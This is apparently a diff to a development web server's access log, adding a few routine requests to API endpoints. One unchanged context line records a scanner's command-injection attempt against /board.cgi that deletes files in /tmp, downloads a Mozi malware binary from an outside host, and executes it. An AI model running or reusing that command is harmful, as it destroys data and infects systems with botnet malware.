@@ -45,3 +45,7 @@ WARNING: This is a development server. Do not use it in a production deployment.
 Press CTRL+C to quit
 59.88.143.63 - - [30/Mar/2026 03:54:30] "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://59.88.143.63:48262/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron HTTP/1.0" 404 -
 146.190.161.227 - - [30/Mar/2026 04:15:45] "CONNECT / HTTP/1.1" 405 -
+82.24.110.51 - - [30/Mar/2026 04:28:32] "GET / HTTP/1.1" 200 -
+149.86.227.60 - - [30/Mar/2026 04:29:24] "GET / HTTP/1.1" 200 -
+82.24.110.51 - - [30/Mar/2026 04:29:50] "POST /api/generate HTTP/1.1" 200 -
+82.24.110.51 - - [30/Mar/2026 04:29:51] "POST /api/publish HTTP/1.1" 201 -
